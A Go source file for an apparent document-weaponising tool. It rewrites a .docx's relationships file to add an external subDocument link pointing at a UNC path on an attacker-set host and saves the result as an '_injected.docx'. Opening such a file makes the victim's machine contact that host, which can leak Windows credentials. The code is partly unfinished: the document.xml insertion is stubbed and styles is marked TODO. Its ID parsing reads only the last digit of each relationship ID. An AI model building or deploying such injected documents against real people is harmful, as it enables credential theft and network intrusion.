package ooxml

import (
	"archive/zip"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"os"
	"sort"
	"strconv"
	"strings"
)

// Initializes routine
func Initialize(fileName string) error {
	log.Println("Opening document...")

	// Read zip (ooxml) file
	r, err := zip.OpenReader(fileName)
	if err != nil {
		return err
	}
	defer r.Close()

	// Loop through all the files inside the zip
	for _, f := range r.File {
		rc, err := f.Open()
		if err != nil {
			return err
		}

		// Read all the data inside the file
		zipData, err := io.ReadAll(rc)
		if err != nil {
			return err
		}
		rc.Close()

		// Call editPackage to change the contents of the target file
		if err = editPackage(f, zipData); err != nil {
			return err
		}
	}

	// Call writePackage to save the edited contents to a file
	if err = writePackage(fmt.Sprintf("%s_injected.docx", strings.Split(fileName, ".")[0])); err != nil {
		return err
	}

	return nil
}

// Edits the contents of a zip file
func editPackage(zipFile *zip.File, zipData []byte) error {
	// Only the list of files we need to change
	switch zipFile.Name {
	case CDocumentXMLRels: // Add a new relationship element to the list
		rs := Relationships{}
		if err := xml.Unmarshal(zipData, &rs); err != nil {
			return err
		}

		var idList []int
		for _, rel := range rs.Relationships {
			out, err := strconv.Atoi(rel.Id[len(rel.Id)-1:])
			if err != nil {
				return err
			}

			idList = append(idList, out)
		}
		sort.Ints(idList)
		targetId := fmt.Sprintf("rId%d", idList[len(idList)-1]+1)

		rs.Relationships = append(rs.Relationships, Relation{
			Id:         targetId,
			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
			Target:     fmt.Sprintf("file:///\\\\%s\\doc\\", GlobalVar.Target),
			TargetMode: "External",
		})

		rsParsed, err := marshalWithHeader(rs)
		if err != nil {
			return err
		}

		appendToZip(zipFile.Name, rsParsed)

	case CDocument: // The idea here is find the position of the last </w:p> before <w:sectPr> and append the subdoc element before that
		appendToZip(zipFile.Name, zipData)

	case CStyles: // TODO
		appendToZip(zipFile.Name, zipData)
	default: // Appends all other unchanged files to the zip
		appendToZip(zipFile.Name, zipData)
	}

	return nil
}

// Writes a new zip file with the edited content
func writePackage(fileName string) error {
	f, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer f.Close()

	w := zip.NewWriter(f)

	for _, file := range ZipArray.Files {
		log.Printf("%s", file.Name)

		zf, err := w.Create(file.Name)
		if err != nil {
			return err
		}

		if _, err = zf.Write([]byte(file.Contents)); err != nil {
			return err
		}
	}

	err = w.Close()
	if err != nil {
		return err
	}

	return nil
}

// Appends file and data to a new zip file
func appendToZip(zipName string, zipData []byte) {
	ZipArray.Files = append(ZipArray.Files, ZipFile{
		Name:     zipName,
		Contents: zipData,
	})
}

// Marshals the XML data with the custom XML Prolog
func marshalWithHeader(v interface{}) ([]byte, error) {
	parsed, err := xml.Marshal(v)
	if err != nil {
		return nil, err
	}
	parsed = []byte(Header + string(parsed))

	return parsed, nil
}
